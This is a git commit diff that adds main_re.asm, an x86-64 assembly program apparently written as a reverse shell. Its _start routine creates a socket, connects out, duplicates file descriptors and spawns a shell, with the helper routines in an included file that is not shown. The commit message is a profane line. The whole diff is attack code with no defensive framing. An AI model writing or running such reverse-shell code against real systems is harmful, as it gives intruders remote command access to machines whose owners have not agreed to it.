0af2e784ae7452471e103b8c5224ee2ece4e3d66
Ramdhan <ramdhan@localhost.localdomain>
2021-02-18 09:24:37 +0700

    fuck this shit

---
+++ main_re.asm
@@ -0,0 +1,25 @@
+%include 'include/re.asm'
+
+section .text
+    global _start
+
+_start:
+    call _socket
+    cmp rax, 3
+    jne _exit_error
+
+    call _connect
+    cmp rax, 0
+    jne _exit_error
+
+    call _dup_fd
+    cmp rax, 0
+    jne _exit_error
+    
+    call _shell_spawn
+    cmp rax, -1
+    je _exit_error
+
+    call _exit
+
+
